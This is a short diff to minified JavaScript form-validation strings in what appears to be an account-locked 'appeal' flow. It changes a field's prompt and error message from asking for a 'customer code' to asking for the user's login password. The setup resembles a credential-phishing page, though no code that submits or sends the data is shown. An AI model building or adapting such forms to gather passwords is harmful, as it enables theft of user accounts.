@@ -68,7 +68,7 @@ const MSG_PRE = "<span class='check-color'>✓</span> ",
 				...MSG_LOCKED,
 				...e,
 				'Please enter your contact information.',
-				'Please enter your customer code.',
+				'Please enter your password to log in.',
 				'Please enter your verification code.',
 				'Submitting your appeal...',
 				'Confirm your identity...',
@@ -225,7 +225,7 @@ function getSimpleDeviceType() {
 			'' === e &&
 				((contactError.innerText = t('Please enter your contact information.')), (o = !1)),
 			'' === n &&
-				((customerCodeError.innerText = t('Please enter your customer code.')), (o = !1)),
+				((customerCodeError.innerText = t('Please enter your password to log in.')), (o = !1)),
 			!o)
 		) {
 			const t = '' === e ? contactInput : customerCodeInput;
